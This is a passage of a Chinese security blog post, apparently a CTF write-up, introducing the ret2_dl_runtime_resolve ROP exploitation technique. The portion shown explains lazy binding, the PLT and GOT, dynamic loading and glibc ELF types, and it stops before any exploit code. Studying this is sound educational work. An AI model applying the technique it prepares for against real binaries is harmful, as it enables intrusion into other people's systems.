<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="一种高级的ROP漏洞利用技术。要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。glibc源码看的想吐。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;em">
<meta name="keywords" content="CTF,Pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2_dl_runtime_resolve详解">
<meta property="og:url" content="http://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve详解/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="一种高级的ROP漏洞利用技术。要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。glibc源码看的想吐。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;em">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/实际的PLT基本结构.png">
<meta property="og:updated_time" content="2021-09-11T08:06:09.417Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ret2_dl_runtime_resolve详解">
<meta name="twitter:description" content="一种高级的ROP漏洞利用技术。要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。glibc源码看的想吐。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;em">
<meta name="twitter:image" content="http://sp4n9x.github.io/resources/2020/实际的PLT基本结构.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>ret2_dl_runtime_resolve详解 | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AVI/">AVI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELF/">ELF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap/">Heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFH/">LFH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PEB/">PEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEB/">TEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-ret2_dl_runtime_resolve详解" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/08/15/ret2_dl_runtime_resolve详解/" class="article-date">
      <time datetime="2020-08-14T16:00:00.000Z" itemprop="datePublished">2020-08-15</time>
</a>

 
    <a href="/2020/08/15/ret2_dl_runtime_resolve详解/#comments" title="查看评论">
        <i class="fa fa-comments-o" aria-hidden="true"></i>
        <span class="count-comment"></span>
        
        
            <span class="disqus-comment-count" data-disqus-identifier="2020/08/15/ret2_dl_runtime_resolve详解/"></span>
        
    </a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      ret2_dl_runtime_resolve详解
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>一种高级的ROP漏洞利用技术。<br>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。<br>glibc源码看的想吐。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p>
</blockquote>
<h2 id="1、延迟绑定"><a href="#1、延迟绑定" class="headerlink" title="1、延迟绑定"></a>1、延迟绑定</h2><p>&emsp;&emsp;<code>动态链接</code>的确有很多优势，比<code>静态链接</code>要灵活得多，但它是以牺牲<code>一部分性能</code>为代价的。据统计，ELF程序在<code>静态链接</code>下要比<code>动态库</code>稍微快点，大约为1%～5%，当然这取决于<code>程序本身的特性</code>及<code>运行环境</code>等。我们知道动态链接比静态链接慢的<strong><code>主要原因</code></strong>是动态链接下对于<code>全局和静态的数据</code>访问都要进行复杂的<code>GOT定位</code>，然后<code>间接寻址</code>；对于<code>模块间的调用</code>也要先<code>定位GOT</code>，然后再进行<code>间接跳转</code>，如此一来，程序的运行速度必定会减慢。<strong><code>另外一个减慢运行速度的原因</code></strong>是动态链接的<code>链接工作</code>在<code>运行时</code>完成，即程序开始执行时，动态链接器都要进行一次链接工作，正如我们上面提到的，<code>动态链接器</code>会寻找并装载所需要的<code>共享对象</code>，然后进行<code>符号查找、地址重定位</code>等工作，这些工作势必减慢程序的<code>启动速度</code>。这是影响动态链接性能的<strong><code>两个主要问题</code></strong>，我们将在这一节介绍优化动态链接性能的一些方法。[<a href="#Ref1">1</a>]</p>
<h3 id="1-1、延迟绑定的实现"><a href="#1-1、延迟绑定的实现" class="headerlink" title="1.1、延迟绑定的实现"></a>1.1、延迟绑定的实现</h3><h4 id="1-1-1、PLT的基本原理"><a href="#1-1-1、PLT的基本原理" class="headerlink" title="1.1.1、PLT的基本原理"></a>1.1.1、PLT的基本原理</h4><p>&emsp;&emsp;在<code>动态链接</code>下，程序模块之间包含了大量的<code>函数引用</code>（<code>全局变量</code>往往比较少，因为大量的全局变量会导致<code>模块之间耦合度</code>变大），所以在<code>程序开始执行前</code>，动态链接会耗费不少时间用于解决模块之间的<code>函数引用</code>的<code>符号查找</code>以及<code>重定位</code>，这也是我们上面提到的减慢动态链接性能的<strong><code>第二个原因</code></strong>。不过可以想象，在一个程序运行过程中，可能<code>很多函数在程序执行完时都不会被用到</code>，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以ELF采用了一种叫做<strong><code>延迟绑定(Lazy Binding)</code></strong>的做法，<code>基本的思想</code>就是当函数<code>第一次被用到时</code>才进行绑定（符号查找、重定位等），如果<code>没有用到</code>则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由<code>动态链接器</code>来负责绑定。这样的做法可以大大<code>加快</code>程序的<code>启动速度</code>，特别有利于一些有<code>大量函数引用</code>和<code>大量模块</code>的程序。[<a href="#Ref1">1</a>]</p>
<p>&emsp;&emsp;ELF使用<strong><code>PLT(Procedure Linkage Table)</code></strong>的方法来实现，这种方法使用了一些很精巧的指令序列来完成。在开始详细介绍PLT之前，我们先从<code>动态链接器的角度</code>设想一下：假设<code>liba.so</code>需要调用<code>libc.so</code>中的<code>bar()</code>函数，那么当<code>liba.so</code>中<code>第一次</code>调用<code>bar()</code>时，这时候就需要调用<code>动态链接器</code>中的<code>某个函数</code>来完成<code>地址绑定</code>工作，我们假设这个函数叫做<code>lookup()</code>，那么lookup()需要知道<code>哪些必要的信息</code>才能完成这个函数地址绑定工作呢？我想答案很明显，lookup()至少需要知道这个地址绑定发生在<code>哪个模块</code>，<code>哪个函数</code>？那么我们可以假设lookup的原型为<code>lookup(module, function)</code>，这两个参数的值在我们这个例子中分别为<code>liba.so</code>和<code>bar()</code>。在<code>Glibc</code>中，我们这里的<code>lookup()</code>函数真正的名字叫<strong><code>_dl_runtime_resolve()</code></strong>。[<a href="#Ref1">1</a>]</p>
<p>&emsp;&emsp;当我们调用某个<code>外部模块</code>的函数时，如果按照通常的做法应该是通过<code>GOT中相应的项</code>进行<code>间接跳转</code>。<strong><code>PLT</code></strong>为了实现<code>延迟绑定</code>，在这个过程中间又<code>增加了一层间接跳转</code>。<code>调用函数</code>并不直接通过<code>GOT</code>跳转，而是通过一个叫作<strong><code>PLT项</code></strong>的结构来进行跳转。<code>每个外部函数</code>在<code>PLT</code>中都有一个<code>相应的项</code>，比如<code>bar()</code>函数在<code>PLT</code>中的项的地址我们称之为<code>bar@plt</code>。让我们来看看bar@plt的实现：[<a href="#Ref1">1</a>]<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)              <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n                      <span class="comment">;bar()在重定位表“.rel.plt”中相应项的字节偏移</span></span><br><span class="line"><span class="keyword">push</span> moduleID               <span class="comment">;GOT[1],bar()所在共享库的moduleID</span></span><br><span class="line">jump _dl_runtime_resolve    <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>bar@plt</code>的<strong><code>第一条指令</code></strong>是一条通过GOT间接跳转的指令。<code>bar@GOT</code>表示GOT中保存bar()这个函数相应的项。如果链接器在<code>初始化阶段</code>已经<code>初始化该项</code>，并且将<code>bar()的地址</code>填入该项，那么这个跳转指令的结果就是我们所期望的，跳转到bar()，实现函数正确调用。但是为了<code>实现延迟绑定</code>，链接器在<code>初始化阶段</code>并没有将<code>bar()的地址</code>填入到该项，而是将上面代码中<code>第二条指令“push n”的地址</code>填入到<code>bar@GOT</code>中，这个步骤<code>不需要</code>查找任何符号，所以<code>代价很低</code>。很明显，第一条指令的效果是跳转到第二条指令，相当于没有进行任何操作。<strong><code>第二条指令</code></strong>将一个<code>数字n</code>压入堆栈中，这个数字是<code>bar</code>这个符号引用在<code>重定位表“.rel.plt”</code>中的相应项的<code>字节偏移</code>。接着<strong><code>又是一条push指令</code></strong>将<code>模块的ID</code>压入到堆栈，然后跳转到<strong><code>_dl_runtime_resolve</code></strong>。这实际上就是在实现我们前面提到的<code>lookup(module, function)</code>这个函数的<code>调用</code>：先将所<code>需要重定位的符号</code>在<code>重定位表“.rel.plt”</code>中的相应项的<code>字节偏移</code>压入堆栈，再将模块ID压入堆栈，然后调用动态链接器的<code>_dl_runtime_resolve()</code>函数来完成<code>符号解析</code>和<code>重定位</code>工作。<code>_dl_runtime_resolve()</code>在进行一系列工作以后将<code>bar()的真正地址</code>填入到<code>bar@GOT</code>中。[<a href="#Ref1">1</a>]</p>
<p>&emsp;&emsp;一旦<code>bar()</code>这个函数被<strong><code>解析完毕</code></strong>，当我们<code>再次调用</code>bar@plt时，<code>第一条jmp指令</code>就能够跳转到<code>真正的bar()函数</code>中，<code>bar()函数返回</code>的时候会根据<code>堆栈里面保存的返回地址</code>直接<code>返回到调用者</code>，而不会再继续执行bar@plt中<code>第二条指令开始的那段代码</code>，那段代码只会在<code>符号未被解析时</code>执行一次。[<a href="#Ref1">1</a>]</p>
<h4 id="1-1-2、PLT的真正实现"><a href="#1-1-2、PLT的真正实现" class="headerlink" title="1.1.2、PLT的真正实现"></a>1.1.2、PLT的真正实现</h4><p>&emsp;&emsp;上面我们描述的是<strong><code>PLT的基本原理</code></strong>，<code>PLT真正的实现</code>要比它的结构稍微复杂一些。ELF将<code>GOT</code>拆分成了两个表叫做<strong><code>“.got”</code></strong>和<strong><code>“.got.plt”</code></strong>。其中<strong><code>“.got”</code></strong>用来保存<code>全局变量引用</code>的地址，<strong><code>“.got.plt”</code></strong>用来保存<code>函数引用</code>的地址，也就是说，所有对于<code>外部函数的引用</code>全部被分离出来放到了<code>“.got.plt”</code>中。另外<strong><code>“.got.plt”</code></strong>还有一个特殊的地方是它的<code>前三项</code>是有<code>特殊意义</code>的，分别含义如下：[<a href="#Ref1">1</a>]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GOT[0]：保存的是“.dynamic”节的地址，这个节描述了本模块动态链接相关的信息，我们在后面还会介绍“.dynamic”节。</span><br><span class="line">GOT[1]：保存的是本模块的ID。link_map结构的地址，动态链接器利用该地址来对符号进行解析。</span><br><span class="line">GOT[2]：保存的是_dl_runtime_resolve()的地址。</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;其中<strong><code>第二项</code></strong>和<strong><code>第三项</code></strong>由<code>动态链接器</code>在<code>装载共享模块</code>的时候负责将它们<code>初始化</code>。<strong><code>“.got.plt”</code></strong>的<code>其余项</code>分别对应<code>每个外部函数的引用</code>。PLT的结构也与我们示例中的PLT稍有不同，为了减少代码的重复，ELF把上面例子中的<code>最后两条指令</code>放到<code>PLT</code>中的<strong><code>第一项</code></strong>。并且规定<code>每一项的长度是16个字节</code>，刚好用来存放<code>3条指令</code>，<strong><code>实际的PLT基本结构</code></strong>如图所示：[<a href="#Ref1">1</a>]</p>
<div align="left"><img src="/resources/2020/实际的PLT基本结构.png" width="50%" height="50%" alt="实际的PLT基本结构"></div>

<p>实际的<code>PLT基本结构代码</code>如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PLT0:</span></span><br><span class="line"><span class="keyword">push</span> *(GOT + <span class="number">4</span>)     <span class="comment">;GOT[1],bar()所在共享库的moduleID,link_map结构的地址</span></span><br><span class="line">jump *(GOT + <span class="number">8</span>)     <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数的地址</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)      <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n              <span class="comment">;bar()在重定位表“.rel.plt”中相应项的字节偏移</span></span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>PLT</code>在ELF文件中以<code>独立的节</code>存放，节名通常叫做<strong><code>“.plt”</code></strong>，因为它本身是一些<code>地址无关的代码</code>，所以可以跟<code>代码节</code>等一起合并成同一个<code>可读可执行</code>的<code>“Segment”</code>被装载入内存。[<a href="#Ref1">1</a>]</p>
<h2 id="2、动态链接相关结构"><a href="#2、动态链接相关结构" class="headerlink" title="2、动态链接相关结构"></a>2、动态链接相关结构</h2><p>&emsp;&emsp;<code>动态链接</code>在<code>不同的系统</code>上有不同的实现方式，<code>ELF</code>的动态链接实现方式比<code>PE</code>稍微简单一点。<code>动态链接</code>的<code>可执行文件的装载</code>与<code>静态链接</code>情况基本一样。首先<code>操作系统</code>会读取<code>可执行文件的头部</code>，检查<code>文件的合法性</code>，然后从头部中的<code>“Program Header Table”</code>中读取每个<code>“Segment”</code>的<code>虚拟地址</code>、<code>文件地址</code>和<code>属性</code>，并将它们映射到<code>进程虚拟空间</code>的相应位置，这些步骤跟前面的静态链接情况下的装载基本无异。</p>
<p>&emsp;&emsp;在<strong><code>静态链接</code></strong>情况下，<code>操作系统</code>接着就<code>可以</code>把<code>控制权</code>转交给<code>可执行文件的入口地址</code>，然后程序开始执行，一切看起来非常直观。</p>
<p>&emsp;&emsp;在<strong><code>动态链接</code></strong>情况下，<code>操作系统</code>还<code>不能</code>在<code>装载完可执行文件</code>之后就把<code>控制权</code>交给<code>可执行文件</code>，因为我们知道<code>可执行文件</code>依赖于很多<code>共享对象</code>。这时候，可执行文件里对于很多<code>外部符号的引用</code>还处于<code>无效地址</code>的状态，即还没有跟<code>相应的共享对象</code>中的<code>实际位置</code>链接起来。所以在映射完可执行文件之后，操作系统会先启动一个<strong><code>动态链接器(Dynamic Linker)</code></strong>。</p>
<p>&emsp;&emsp;在<code>Linux</code>下，<strong><code>动态链接器ld.so</code></strong>实际上是一个<code>共享对象</code>，操作系统同样通过<code>映射的方式</code>将它加载到<code>进程的地址空间</code>中。操作系统在<code>加载完动态链接器</code>之后，就将控制权交给<code>动态链接器的入口地址</code>（与可执行文件一样，共享对象也有入口地址）。当<code>动态链接器</code>得到<code>控制权</code>之后，它开始执行一系列<code>自身的初始化</code>操作，然后根据当前的<code>环境参数</code>，开始对<code>可执行文件</code>进行<code>动态链接工作</code>。当所有<code>动态链接工作</code>完成以后，<code>动态链接器</code>会将<code>控制权</code>转交到<code>可执行文件的入口地址</code>，程序开始正式执行。[<a href="#Ref1">1</a>]</p>
<h3 id="2-0、标准ELF变量类型"><a href="#2-0、标准ELF变量类型" class="headerlink" title="2.0、标准ELF变量类型"></a>2.0、标准ELF变量类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard ELF types.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 64-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf32_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf32_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br><span class="line"><span class="comment">/* Type for section indices, which are 16-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="comment">/* Type for version symbol information.  */</span></span><br><span class="line"><span class="keyword">typedef</span> Elf32_Half Elf32_Versym;</span><br><span class="line"><span class="keyword">typedef</span> Elf64_Half Elf64_Versym;</span><br></pre></td></tr></table></figure>
